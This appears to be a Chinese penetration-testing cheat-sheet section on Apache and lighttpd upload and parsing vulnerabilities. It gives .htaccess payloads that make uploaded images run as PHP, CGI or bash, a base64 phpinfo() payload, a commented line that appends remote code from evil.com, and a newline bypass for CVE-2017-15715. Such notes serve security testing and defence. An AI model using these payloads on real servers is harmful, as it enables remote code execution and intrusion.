Apache
========================================

后缀解析
----------------------------------------
``test.php.x1.x2.x3`` （ x1,x2,x3 为没有在 mime.types 文件中定义的文件类型）。Apache 将从右往左开始判断后缀， 若x3为非可识别后缀，则判断x2，直到找到可识别后缀为止，然后对可识别后缀进行解析

.htaccess
----------------------------------------
当AllowOverride被启用时，上传启用解析规则的.htaccess

::

    AddType application/x-httpd-php .jpg

::

    php_value auto_append_file .htaccess
    #<?php phpinfo();

::

    Options ExecCGI
    AddHandler cgi-script .jpg

::

    Options +ExecCGI
    AddHandler fcgid-script .gif
    FcgidWrapper "/bin/bash" .gif

::

    php_flag allow_url_include 1
    php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
    #php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
    #php_value auto_append_file https://evil.com/evil-code.txt

目录遍历
----------------------------------------
配置 ``Options +Indexes`` 时Apache存在目录遍历漏洞。

CVE-2017-15715
----------------------------------------
``%0A`` 绕过上传黑名单。

lighttpd
----------------------------------------
``xx.jpg/xx.php``

参考链接
----------------------------------------
- `Apache 上传绕过 <https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html>`_
